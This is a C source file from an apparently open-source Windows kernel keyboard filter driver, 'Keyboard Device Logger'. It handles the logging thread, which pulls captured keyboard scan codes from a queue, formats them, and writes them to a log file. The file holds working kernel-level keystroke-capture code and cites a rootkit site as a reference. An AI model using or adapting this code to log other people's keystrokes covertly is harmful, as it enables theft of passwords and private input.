/*
 *   Keyboard Device Logger
 *   Copyright (C) 2005 Jason Todd
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *
 *   This is a simple keyboard device filter that attaches itself to the kbclass
 *   and gleams scan codes from the IRP as they pass up the stack.
 *
 *   This file handles all the thread related functions.
 *
 *   REFERENCE for this code :
 *    Programing the Microsoft Windows Driver Model - Walter Oney : ISBN 0-7356-1803-8
 *    kbfilter.c - DDK
 *    Ctrl2Cap 2.0 - http://www.sysinternals.com/
 *    KLog 1.0 - http://www.rootkit.com/
 */

#include "kdl.h"
#include "kdlthread.h"
#include "kdlfile.h"
#include <ntstrsafe.h>

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Create a system thread and link it to LogThreadFunc()
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
NTSTATUS CreateLoggingThread( IN PDEVICE_OBJECT theDeviceObject )
{

NTSTATUS           Status;
HANDLE             tmpThreadHandle; 
PDEVICE_EXTENSION  theDeviceExtension;

KdPrint( ("KDL: CreateLoggingThread() Called.\n") );

   theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension;
	
            // DDK: "Creates a system thread that executes in kernel mode and returns a 
            //       handle for the thread."
   Status = PsCreateSystemThread( &tmpThreadHandle,    // ThreadHandle
	                              THREAD_ALL_ACCESS,   // DesiredAccess
                                  NULL,                // ObjectAttributes
						          NULL,                // ProcessHandle
						          NULL,                // ClientId 
						          LogThreadFunc,       // StartRoutine
						          theDeviceExtension );// StartContext
   // Error Check
   if ( !NT_SUCCESS( Status ) )
   {
// If we can not create a logging thread should we not remove the device?
    return Status;
   }

KdPrint( ("KDL: PsCreateSystemThread() Successfull.\n") );

	// DDK: "Provides access validation on the object handle, and, if access can be 
    //       granted, returns the corresponding pointer to the object's body."
	ObReferenceObjectByHandle( tmpThreadHandle,                           // Handle
		                       THREAD_ALL_ACCESS,                         // DesiredAccess
							   NULL,                                      // ObjectType 
							   KernelMode,                                // AccessMode
		                       (PVOID*)&theDeviceExtension->LoggingThread,// Object 
							   NULL );                                    // HandleInformation 

    // Close our tmpLoggingThread Handle since we now have access to it through
	// theDeviceExtension->LoggingThread
	ZwClose( tmpThreadHandle );
   // Mark in PDEVICE_EXTENSION that the thread is now active
   theDeviceExtension->ActiveLogThread = TRUE;
	
 return Status;
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Worker function of the thread for grabbing the key data off of the linked
 * list and formating the data. This function holds itself in a while loop to keep it from 
 * terminating until theDeviceExtension->ActiveLogThread = FALSE is set. Inside the while 
 * loop KeWaitForSingleObject() blocks until it is signaled by KDL_ReadComplete(). 
 * At witch point the thread is awaken and begins to process the key data that was 
 * added to the linked list by that function.
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID LogThreadFunc( IN PVOID Context ) 
{

PDEVICE_EXTENSION theDeviceExtension;


KdPrint( ("KDL: LogThreadFunc() Called.\n") );

    // Twiddle ptrs so we can access PDEVICE_EXTENSION
    theDeviceExtension = ( PDEVICE_EXTENSION ) Context;

	// Main loop to keep the thread alive while we wait for a work singal from KDL_ReadComplete()
    while ( theDeviceExtension->ActiveLogThread != FALSE )
    {
     // Block and Wait to be signaled from the DispatchRead Function
     KeWaitForSingleObject( &theDeviceExtension->Semaphore,// Object
		                    Executive,                     // WaitReason
							KernelMode,                    // WaitMode
							FALSE,                         // Alertable
							NULL );	                       // Timeout

	 // Check to see if we were woke up to do work or exit
	 if ( theDeviceExtension->ActiveLogThread == FALSE ) continue;

	  // Dump our linked list of cached key data
      ProcessKeyCache( theDeviceExtension, theDeviceExtension->MaxListSize );

	} // End while ( theDeviceExtension->ActiveLogThread != FALSE )

   // Since we are shutting down dump whatever was present in the list at the time
   ProcessKeyCache( theDeviceExtension, theDeviceExtension->CurrentListSize );

  // If we have exited the main loop then it is time for us to terminate
  PsTerminateSystemThread( STATUS_SUCCESS );

KdPrint( ("KDL: PsTerminateSystemThread() Called.\n") );
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Tear down our thread by setting theDeviceExtension->ActiveLogThread = FALSE and 
 * signaling that we have to processed the change. This will cause the while loop in 
 * the LogThreadFunc() to exit and terminate by making the call to PsTerminateSystemThread()
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID DestroyLoggingThread( IN PDEVICE_OBJECT theDeviceObject )
{

PDEVICE_EXTENSION   theDeviceExtension;

KdPrint( ("KDL: DestroyLoggingThread() Called.\n") );

    theDeviceExtension = ( PDEVICE_EXTENSION ) theDeviceObject->DeviceExtension;
    // Signal LogThreadFunc() to stop processing loop and terminate
    theDeviceExtension->ActiveLogThread = FALSE;

	// Wake up LogThreadFunc() if it is blocking so it can recieve the change in
    // theDeviceExtension->ActiveLogThread and terminate itself.
    KeReleaseSemaphore( &theDeviceExtension->Semaphore,// Semaphore
			            0,                             // Increment
					    1,                             // Adjustment
						TRUE );                        // Wait
	// Wait for the thread too terminate
	KeWaitForSingleObject( theDeviceExtension->LoggingThread,// Object
                           Executive,                        // WaitReason
                           KernelMode,                       // WaitMode
                           FALSE,                            // Alertable
                           NULL );                           // Timeout

}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Format our scan codes into the appropriate string
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID FormatKey( PDEVICE_EXTENSION DE, char * format, ... )
{

va_list           args;
UCHAR             FormattedKeyData[16]; // This size is dependant on the size of the data you pass this function
NTSTATUS          Status;
IO_STATUS_BLOCK   io_status;

   // http://msdn.microsoft.com/library/default.asp?url=/library/en-us/vclib/html/_crt_va_arg.2c_.va_end.2c_.va_start.asp
   va_start( args, format );
   // Format our keydata into a string for file write
   // DDK: "Create a byte-counted text string, with formatting that is based 
   //       on supplied formatting information."
   RtlStringCbVPrintfA( FormattedKeyData,    // pszDest
                        16 * sizeof( UCHAR ),// cbDest
					    format,              // pszFormat
					    args );              // argList
   // Concat our formatted data onto the file write string
   RtlCopyMemory( DE->WriteBuffer+DE->BufferMark, 
	              FormattedKeyData , 
				  sizeof( char )*strlen( FormattedKeyData )+1 );
   // Align our buffer marker so we can add the next converted scan code
   DE->BufferMark += ( USHORT ) strlen( FormattedKeyData );
   // http://msdn.microsoft.com/library/default.asp?url=/library/en-us/vclib/html/_crt_va_arg.2c_.va_end.2c_.va_start.asp
   va_end( args );
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Process our key data from the linked list
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
VOID ProcessKeyCache( PDEVICE_EXTENSION theDeviceExtension,
				      ULONG Count ) 
{

ULONG             i;
PLIST_ENTRY       theListEntry;
PKEY_DATA         theKeyData;


KdPrint( ("KDL: LogThreadFunc() Processing. List Size [%d]\n",( theDeviceExtension->LookList->L.TotalAllocates - theDeviceExtension->LookList->L.TotalFrees )) );

   // Allocate some memory to use as our string buffer for the pieces of the linked list that we
   // are going correlate and write to the log file
   theDeviceExtension->WriteBuffer = ExAllocatePoolWithTag( NonPagedPool, 
					                                        (sizeof( UCHAR )*strlen( STRING_FORMAT )*theDeviceExtension->MaxListSize ),
					                                        POOL_TAG_WRITEBUFFER );

KdPrint( ("KDL: ExAllocatePoolWithTag() theDeviceExtension->WriteBuffer 0x%x\n", theDeviceExtension->WriteBuffer) );

    // Zero out our buffer before we begin to patch the keydata into it
    RtlZeroMemory( theDeviceExtension->WriteBuffer, (sizeof( UCHAR )*strlen( STRING_FORMAT )*theDeviceExtension->MaxListSize) );
    // Reset our buffer marker since we are starting agian with a new string
	theDeviceExtension->BufferMark = 0;
    // Loop through our list and buffer it into a single list for file write 
    for ( i=0; i < Count; i++ )
	{
//KdPrint( ("KDL: Dumping List. List Size [%d]\n", ( theDeviceExtension->LookList->L.TotalAllocates - theDeviceExtension->LookList->L.TotalFrees ) ) );

     // Pop the first entry off the list of processing
	 theListEntry = ExInterlockedRemoveHeadList( &theDeviceExtension->ListHead,
												 &theDeviceExtension->SpinLock );
     // Use CONTAINING_RECORD MACRO to give access to the data fields
	 theKeyData = CONTAINING_RECORD( theListEntry,// Address 
	  	                             KEY_DATA,    // Type
							         ListEntry ); // Field
     // Format and concat our key data in theDeviceExtension->WriteBuffer
     FormatKey( theDeviceExtension,
		        STRING_FORMAT, // #define STRING_FORMAT "%d:%x:%x "
//				theKeyData->KeyUnitId, 
			    theKeyData->KeyMakeCode,
				theKeyData->KeyFlags );

//KdPrint( ("KDL: ExFreeToNPagedLookasideList() theListEntry 0x%x\n", theListEntry) );

     // Free our list entry since it has been logged to the file
     ExFreeToNPagedLookasideList( theDeviceExtension->LookList, theListEntry );

//KdPrint( ("KDL: [%s] (%d)\n", theDeviceExtension->WriteBuffer, strlen( theDeviceExtension->WriteBuffer )) );

	} // End for ( i=0; i<=theDeviceExtension->MaxListSize ;i++ )

     // Write theDeviceExtension->WriteBuffer out to the file
     WriteDataFile( theDeviceExtension );

KdPrint( ("KDL: ExFreePoolWithTag() theDeviceExtension->WriteBuffer 0x%x\n", theDeviceExtension->WriteBuffer) );

   // Free our working string memory
   ExFreePoolWithTag( theDeviceExtension->WriteBuffer, POOL_TAG_WRITEBUFFER );

}